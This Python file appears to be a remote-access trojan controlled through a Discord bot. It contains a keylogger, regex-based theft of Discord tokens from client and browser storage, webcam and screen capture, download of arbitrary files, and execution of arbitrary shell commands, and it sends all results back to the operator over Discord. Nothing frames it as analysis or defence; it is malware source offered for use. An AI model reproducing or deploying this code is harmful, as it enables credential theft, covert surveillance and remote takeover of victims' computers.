from cv2 import cv2
import requests
import discord
from discord.ext import commands
import asyncio
import os
import subprocess
import pyautogui
from pynput.keyboard import Listener
import threading
import re

local = os.getenv('LOCALAPPDATA')
user = os.getenv('USERNAME')
roaming = os.getenv('APPDATA')
tokens = []

stable = roaming + '\\discord\\Local Storage\\leveldb'
canary = roaming + '\\discordcanary\\Local Storage\\leveldb',
ptb = roaming + '\\discordptb\\Local Storage\\leveldb',
chrome = local + '\\Google\\Chrome\\User Data\\Default',
opera = roaming + '\\Opera Software\\Opera Stable',
yandex = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ' [SHIFT] '
    if key == 'Key.ctrl_l':
        key = ' [CTRL] '
    if key == "Key.enter":
        key = '\n'
    if key == "Key.backspace":
        key = ' [DELETE] '
    if key == "key.cmd":
        key = ' [WINKEY] '

    with open("C:\\Users\\" + user + "\\AppData\\Temp" + "\\log.txt", 'a') as f:
        f.write(key)

def keylogger():
    with Listener(on_press=log_keystroke) as l:
        l.join()

token = "token" #insert target token
prefix = "rootkit!"
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix)

@bot.event
async def on_ready():
    keyloggerthread = threading.Thread(target=keylogger)
    keyloggerthread.start()

@bot.command()
async def get_tokens(ctx, arg1):
    args = str(arg1)
    if args == "Canary":
        if os.path.isdir(str(canary)):
            find_tokens(str(canary))
        else:
            await ctx.send("Canary not found")

    if args == "Stable":
        if os.path.isdir(str(stable)):
            find_tokens(str(stable))
        else:
            await ctx.send("Stable not found")

    if args == "PTB":
        if os.path.isdir(str(ptb)):
            find_tokens(str(ptb))
        else:
            await ctx.send("PTB not found")

    if args == "Chrome":
        if os.path.isdir(str(chrome)):
            find_tokens(str(chrome))
        else:
            await ctx.send("Chrome not found")

    if args == "Yandex":
        if os.path.isdir(str(yandex)):
            find_tokens(str(yandex))
        else:
            await ctx.send("Yandex not found")

    if args == "Opera":
        if os.path.isdir(str(opera)):
            find_tokens(str(opera))
        else:
            await ctx.send("Opera not found")

    else:
        await ctx.send("Specify a platform between: Canary, Stable, PTB, Chrome, Yandex, Opera")
    
    listToStr = '\n'.join(map(str, tokens)) 
    await ctx.send("here are your tokens:\n " + listToStr)

@bot.command()
async def webcamsnap(ctx):
    cam = cv2.VideoCapture(0)
    frame = cam.read()
    cam.release()
    cv2.imwrite("C:\\Users\\" + user + "\\AppData\\Temp\\Snap.jpg",frame)
    cam.release()
    await ctx.send(file=discord.File("C:\\Users\\" + user + "\\AppData\\Temp\\" + "snap.jpg"))
    os.remove("C:\\Users\\" + user + "\\AppData\\Temp\\" + "snap.jpg")

@bot.command()
async def download_files(ctx, arg1, arg2):
    link = '\n'.join(map(str, arg1)) 
    filetosave = '\n'.join(map(str, arg2)) 
    req = requests.get(link, allow_redirects=True)
    with open(filetosave, "wb") as file:
        file.write(req.content)
        file.close()
    await ctx.send("File downloaded")

@bot.command()
async def shellcommand(ctx, *args):
    output = subprocess.getoutput(args)
    await ctx.send(output)

@bot.command()
async def screenshot(ctx):
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("C:\\Users\\Echo\\AppData\\Temp\\screen.png")
    await ctx.send(file=discord.File("C:\\Users\\Echo\\AppData\\Temp\\screen.png"))
    os.remove("C:\\Users\\Echo\\AppData\\Temp\\screen.png")

@bot.command()
async def recievelogs(ctx):
    await ctx.send("here's your log",file=discord.File("C:\\Users\\" + user + "\\AppData\\Temp" + "\\log.txt"))
    os.remove("log.txt")

bot.run(token)
